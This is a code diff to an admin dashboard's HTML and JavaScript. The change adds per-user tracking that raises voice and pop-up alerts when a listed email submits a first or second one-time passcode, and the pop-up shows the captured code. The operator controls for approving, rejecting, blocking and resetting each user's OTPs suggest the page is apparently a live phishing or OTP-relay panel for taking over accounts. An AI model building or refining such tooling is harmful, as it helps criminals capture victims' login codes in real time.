@@ -44,7 +44,6 @@
             100% { background-position: 0% 50%; }
         }
 
-        /* Glassmorphism Navbar */
         .glass-navbar {
             background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(20px);
@@ -132,7 +131,6 @@
             padding: 0 clamp(16px, 4vw, 24px);
         }
 
-        /* Stats Grid - Responsive */
         .stats {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(min(100%, 180px), 1fr));
@@ -198,7 +196,6 @@
             letter-spacing: -1px;
         }
 
-        /* Table Container - Responsive */
         .table-container {
             background: rgba(255, 255, 255, 0.08);
             backdrop-filter: blur(20px);
@@ -252,7 +249,6 @@
         .badge-email { background: rgba(249, 115, 22, 0.3); color: #fed7aa; border: 1px solid rgba(249, 115, 22, 0.5); }
         .badge-never { background: rgba(239, 68, 68, 0.3); color: #fecaca; border: 1px solid rgba(239, 68, 68, 0.5); }
 
-        /* Action Buttons - Always visible */
         .action-buttons {
             display: flex;
             flex-wrap: wrap;
@@ -314,7 +310,6 @@
             transform: scale(1.05);
         }
 
-        /* Toast Notification */
         .toast-notification {
             position: fixed;
             top: clamp(70px, 10vh, 80px);
@@ -465,7 +460,6 @@
             margin-bottom: 16px;
         }
 
-        /* Responsive Dark Mode */
         .dark-mode {
             background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
         }
@@ -499,6 +493,17 @@
             .navbar-right {
                 justify-content: center;
             }
+        }
+
+        /* New badge animation */
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .stat-card.has-new {
+            animation: pulse 1s ease-in-out 3;
+            background: rgba(255, 255, 255, 0.25);
         }
     </style>
 </head>
@@ -563,17 +568,17 @@
             <h3>Total Users</h3>
             <div class="number" id="totalUsers">0</div>
         </div>
-        <div class="stat-card">
+        <div class="stat-card" id="pendingEmailCard">
             <div class="stat-icon"><ion-icon name="mail-outline"></ion-icon></div>
             <h3>Pending Email</h3>
             <div class="number" id="pendingEmail">0</div>
         </div>
-        <div class="stat-card">
+        <div class="stat-card" id="pendingFirstCard">
             <div class="stat-icon"><ion-icon name="key-outline"></ion-icon></div>
             <h3>Pending OTP 1</h3>
             <div class="number" id="pendingFirstOTP">0</div>
         </div>
-        <div class="stat-card">
+        <div class="stat-card" id="pendingSecondCard">
             <div class="stat-icon"><ion-icon name="shield-checkmark-outline"></ion-icon></div>
             <h3>Pending OTP 2</h3>
             <div class="number" id="pendingSecondOTP">0</div>
@@ -747,11 +752,93 @@
         return '#6b7280';
     }
 
+    // ==================== TRACK PREVIOUS STATE FOR ALERTS ====================
+    let previousUserMap = new Map(); // email -> { status, otp, second_otp }
+    let isFirstLoad = true;
+
+    function checkForNewEvents(users) {
+        if (isFirstLoad) {
+            // Store initial state without alerts
+            users.forEach(user => {
+                previousUserMap.set(user.email, {
+                    approved: user.approved,
+                    otp: user.otp,
+                    second_otp: user.second_otp,
+                    otp1_never: user.otp1_never
+                });
+            });
+            isFirstLoad = false;
+            return;
+        }
+
+        // Check each user for changes
+        users.forEach(user => {
+            const previous = previousUserMap.get(user.email);
+            
+            if (!previous) {
+                // NEW USER! (not in previous map)
+                if (!user.otp1_never) {
+                    speakText(`New signup from ${user.email}`, true);
+                    showToast('New Signup', `${user.email} signed up`);
+                    // Animate the pending email stat card
+                    const card = document.getElementById('pendingEmailCard');
+                    card.classList.add('has-new');
+                    setTimeout(() => card.classList.remove('has-new'), 3000);
+                }
+            } else {
+                // Check for NEW FIRST OTP (user had no OTP before, now has OTP)
+                if (!previous.otp && user.otp && !user.otp1_never) {
+                    speakText(`First OTP received from ${user.email}`, true);
+                    showToast('First OTP', `${user.email} submitted OTP: ${user.otp}`);
+                    const card = document.getElementById('pendingFirstCard');
+                    card.classList.add('has-new');
+                    setTimeout(() => card.classList.remove('has-new'), 3000);
+                }
+                
+                // Check for NEW SECOND OTP (user had first OTP approved, now has second OTP)
+                if (!previous.second_otp && user.second_otp && !user.otp1_never) {
+                    speakText(`Second OTP received from ${user.email}`, true);
+                    showToast('Second OTP', `${user.email} submitted second OTP`);
+                    const card = document.getElementById('pendingSecondCard');
+                    card.classList.add('has-new');
+                    setTimeout(() => card.classList.remove('has-new'), 3000);
+                }
+                
+                // Check if user was marked as blocked/never
+                if (!previous.otp1_never && user.otp1_never) {
+                    speakText(`${user.email} has been blocked`, true);
+                    showToast('User Blocked', `${user.email} has been blocked`);
+                }
+            }
+            
+            // Update previous state
+            previousUserMap.set(user.email, {
+                approved: user.approved,
+                otp: user.otp,
+                second_otp: user.second_otp,
+                otp1_never: user.otp1_never
+            });
+        });
+        
+        // Check for deleted users
+        for (let [email, prev] of previousUserMap.entries()) {
+            const stillExists = users.find(u => u.email === email);
+            if (!stillExists && !isFirstLoad) {
+                // User was deleted
+                previousUserMap.delete(email);
+            }
+        }
+    }
+
     async function fetchUsers() {
         try {
             const response = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${token}` } });
             if (response.status === 403) { localStorage.removeItem('adminToken'); window.location.href = '/admin/login'; return; }
             const users = await response.json();
+            
+            // Check for new events BEFORE displaying
+            checkForNewEvents(users);
+            
             displayUsers(users);
             updateStats(users);
         } catch(err) { console.error(err); }
@@ -796,7 +883,6 @@
                 statusBadge = '<span class="badge badge-approved"><ion-icon name="checkmark-done-circle-outline"></ion-icon> Verified</span>';
             }
             
-            // Action buttons - Delete button ALWAYS visible
             let actionButtons = `<div class="action-buttons">`;
             
             if (!user.otp1_never && !user.approved) {
@@ -818,7 +904,6 @@
                 actionButtons += `<button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon>Reset</button>`;
             }
             
-            // Delete button ALWAYS present
             actionButtons += `<button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon>Delete</button></div>`;
             
             return `<tr>
@@ -847,7 +932,7 @@
     function neverFirstOTP(email) { if(confirm(`Mark ${email} as blocked?`)) apiCall('/api/admin/never-first-otp', 'POST', email, 'User blocked', 'Failed'); }
     function approveSecondOTP(email) { apiCall('/api/admin/approve-second-otp', 'POST', email, 'Second OTP approved', 'Failed'); }
     function incorrectSecondOTP(email) { apiCall('/api/admin/incorrect-second-otp', 'POST', email, 'Second OTP incorrect', 'Failed'); }
-    function resetUser(email) { if(confirm(`Reset ${email}?`)) apiCall('/api/admin/reset-user', 'POST', email, 'User reset', 'Failed'); }
+    function resetUser(email) { if(confirm(`Reset ${email}? Will create new record.`)) apiCall('/api/admin/reset-user', 'POST', email, 'User reset', 'Failed'); }
     function deleteUser(email) { if(confirm(`Delete ${email} permanently?`)) apiCall('/api/admin/delete-user', 'DELETE', email, 'User deleted', 'Failed'); }
 
     function setupTheme() {
@@ -857,55 +942,11 @@
         btn.onclick = () => { document.body.classList.toggle('dark-mode'); localStorage.setItem('theme', document.body.classList.contains('dark-mode') ? 'dark' : 'light'); };
     }
 
-    // Polling for incoming events (reliable fallback)
-    let previousSignupsCount = 0;
-    let previousFirstOTPsCount = 0;
-    let previousSecondOTPsCount = 0;
-
-    async function checkForNewEvents() {
-        try {
-            const response = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${token}` } });
-            const users = await response.json();
-            
-            const currentSignups = users.filter(u => !u.approved && !u.otp1_never).length;
-            if (currentSignups > previousSignupsCount && previousSignupsCount !== 0) {
-                const newUser = users.find(u => !u.approved);
-                if (newUser) {
-                    speakText(`New signup from ${newUser.email}`, true);
-                    showToast('New Signup', `${newUser.email} signed up`);
-                }
-            }
-            previousSignupsCount = currentSignups;
-            
-            const currentFirstOTPs = users.filter(u => u.approved && u.otp && !u.otp1_correct).length;
-            if (currentFirstOTPs > previousFirstOTPsCount && previousFirstOTPsCount !== 0) {
-                const newOTP = users.find(u => u.approved && u.otp && !u.otp1_correct);
-                if (newOTP) {
-                    speakText(`First OTP received from ${newOTP.email}`, true);
-                    showToast('First OTP', `${newOTP.email} submitted OTP`);
-                }
-            }
-            previousFirstOTPsCount = currentFirstOTPs;
-            
-            const currentSecondOTPs = users.filter(u => u.otp1_correct && u.second_otp && !u.otp2_correct).length;
-            if (currentSecondOTPs > previousSecondOTPsCount && previousSecondOTPsCount !== 0) {
-                const newSecondOTP = users.find(u => u.otp1_correct && u.second_otp && !u.otp2_correct);
-                if (newSecondOTP) {
-                    speakText(`Second OTP received from ${newSecondOTP.email}`, true);
-                    showToast('Second OTP', `${newSecondOTP.email} submitted second OTP`);
-                }
-            }
-            previousSecondOTPsCount = currentSecondOTPs;
-            
-        } catch(e) { console.log('Polling error:', e); }
-    }
-
     if (Notification.permission === 'default') Notification.requestPermission();
     setupTheme();
     loadVoices();
     fetchUsers();
     setInterval(fetchUsers, 3000);
-    setInterval(checkForNewEvents, 5000);
 
     document.getElementById('testVoiceBtn').onclick = testVoice;
     document.getElementById('ttsToggleBtn').onclick = toggleTTS;
